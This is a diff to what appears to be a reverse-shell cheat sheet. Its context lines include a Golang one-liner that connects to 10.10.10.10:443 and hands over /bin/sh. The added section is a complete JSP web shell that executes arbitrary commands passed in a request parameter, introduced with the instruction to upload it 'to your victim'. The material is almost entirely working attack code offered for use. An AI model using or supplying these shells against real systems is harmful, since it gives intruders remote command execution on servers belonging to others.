@@ -20,6 +20,7 @@ Basic reverse shells for any scenario
 - NodeJS
 - TCLsh
 - Golang
+- JSP
 
 # Python
 
@@ -290,5 +291,46 @@ One-Liner's
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.10.10:443");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 
 // Replace IP & Port
+
+```
+
+# JSP
+
+```
+// Paste below in .jsp file and uplaod to your victim
+
+<%@ page
+import=”java.util.*,java.io.*”%>
+<%
+%>
+<HTML>
+<BODY>
+<H3>Basic JSP Shell</H3>
+<FORM METHOD=”GET” NAME=”myform”
+ACTION=”">
+<INPUT TYPE=”text” NAME=”cmd”>
+<INPUT TYPE=”submit” VALUE=”Execute”>
+</FORM>
+<PRE>
+<%
+if (request.getParameter(“cmd”) != null) {
+out.println(“Command: ” +
+request.getParameter(“cmd”) + “<BR>”);
+Process p =
+Runtime.getRuntime().exec(request.getParameter(“cmd”));
+OutputStream os = p.getOutputStream();
+InputStream in = p.getInputStream();
+DataInputStream dis = new DataInputStream(in);
+String disr = dis.readLine();
+while ( disr != null ) {
+out.println(disr);
+disr = dis.readLine();
+}
+}
+%>
+</PRE>
+</BODY>
+</HTML>
+
 
 ```
